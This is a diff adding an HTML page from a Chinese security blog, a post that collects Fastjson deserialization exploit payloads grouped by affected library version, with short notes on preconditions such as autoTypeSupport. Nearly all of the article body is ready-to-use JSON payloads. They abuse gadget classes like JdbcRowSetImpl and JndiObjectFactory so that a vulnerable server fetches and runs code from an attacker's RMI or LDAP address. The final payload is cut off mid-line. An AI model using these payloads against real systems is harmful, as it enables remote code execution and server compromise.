@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Fastjson 多版本payload集合影响版本： fastjson&lt;&#x3D;1.2.24exp： 1&amp;#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;x.x.x.x:1099&#x2F;jndi&quot;, &quot;autoCommit&amp;q">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Fastjson/Fastjson%20%E5%A4%9A%E7%89%88%E6%9C%ACpayload%E9%9B%86%E5%90%88/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Fastjson 多版本payload集合影响版本： fastjson&lt;&#x3D;1.2.24exp： 1&amp;#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;x.x.x.x:1099&#x2F;jndi&quot;, &quot;autoCommit&amp;q">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-07-08T06:25:56.506Z">
+<meta property="article:modified_time" content="2021-04-21T01:23:46.000Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Fastjson/Fastjson 多版本payload集合" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Fastjson/Fastjson%20%E5%A4%9A%E7%89%88%E6%9C%ACpayload%E9%9B%86%E5%90%88/" class="article-date">
+  <time datetime="2022-07-08T06:25:56.506Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Fastjson-多版本payload集合"><a href="#Fastjson-多版本payload集合" class="headerlink" title="Fastjson 多版本payload集合"></a>Fastjson 多版本payload集合</h1><p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-24"><a href="#fastjson-lt-1-2-24" class="headerlink" title="fastjson&lt;=1.2.24"></a>fastjson&lt;=1.2.24</h3><p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://x.x.x.x:1099/jndi&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-41"><a href="#fastjson-lt-1-2-41" class="headerlink" title="fastjson&lt;=1.2.41"></a>fastjson&lt;=1.2.41</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p>
+<p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,&quot;dataSourceName&quot;:&quot;rmi://x.x.x.x:1098/jndi&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-42"><a href="#fastjson-lt-1-2-42" class="headerlink" title="fastjson&lt;=1.2.42"></a>fastjson&lt;=1.2.42</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p>
+<p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;,&quot;dataSourceName&quot;:&quot;ldap://localhost:1399/Exploit&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-43"><a href="#fastjson-lt-1-2-43" class="headerlink" title="fastjson&lt;=1.2.43"></a>fastjson&lt;=1.2.43</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p>
+<p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[&#123;,&quot;dataSourceName&quot;:&quot;ldap://localhost:1399/Exploit&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-45"><a href="#fastjson-lt-1-2-45" class="headerlink" title="fastjson&lt;=1.2.45"></a>fastjson&lt;=1.2.45</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p>
+<p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&quot;properties&quot;:&#123;&quot;data_source&quot;:&quot;ldap://localhost:1399/Exploit&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-47"><a href="#fastjson-lt-1-2-47" class="headerlink" title="fastjson&lt;=1.2.47"></a>fastjson&lt;=1.2.47</h3><p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.Class&quot;, </span><br><span class="line">        &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;, </span><br><span class="line">    &quot;b&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;, </span><br><span class="line">        &quot;dataSourceName&quot;: &quot;ldap://x.x.x.x:1999/Exploit&quot;, </span><br><span class="line">        &quot;autoCommit&quot;: true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-62"><a href="#fastjson-lt-1-2-62" class="headerlink" title="fastjson&lt;=1.2.62"></a>fastjson&lt;=1.2.62</h3><p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;,&quot;AsText&quot;:&quot;rmi://127.0.0.1:1098/exploit&quot;&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-66"><a href="#fastjson-lt-1-2-66" class="headerlink" title="fastjson&lt;=1.2.66"></a>fastjson&lt;=1.2.66</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p>
+<p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap://192.168.80.1:1389/Calc&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://192.168.80.1:1389/Calc&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;,&quot;jndiNames&quot;:&quot;ldap://192.168.80.1:1389/Calc&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,&quot;properties&quot;: &#123;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Fastjson/Fastjson%20%E5%A4%9A%E7%89%88%E6%9C%ACpayload%E9%9B%86%E5%90%88/" data-id="cl5c2qp4j0079y8v17tweel4e" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Fastjson/%E9%80%9A%E8%BF%87Dnslog%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E4%BD%BF%E7%94%A8fastjson/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Fastjson/Fastjson%20_=1.2.60%20DoS%E6%BC%8F%E6%B4%9E%E6%97%A0%E6%8D%9F%E6%A3%80%E6%B5%8B+Fastjson%E4%B8%8EJackson%E7%BB%84%E5%BB%BA%E5%8C%BA%E5%88%86/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
